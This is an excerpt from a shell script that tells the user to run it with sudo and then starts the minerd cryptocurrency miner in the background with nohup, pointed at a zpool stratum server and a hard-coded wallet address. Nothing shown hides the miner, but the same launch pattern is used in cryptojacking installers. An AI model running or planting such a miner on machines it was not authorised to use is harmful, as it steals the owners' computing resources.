...
echo "sudo sh $0 $vermelho 187iDF5r1HKUTeF5XpxmBou9PQkTdzgzMh \033[0m   \n"
exit 0
fi
...
sleep 10
cd miner
nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 187iDF5r1HKUTeF5XpxmBou9PQkTdzgzMh &
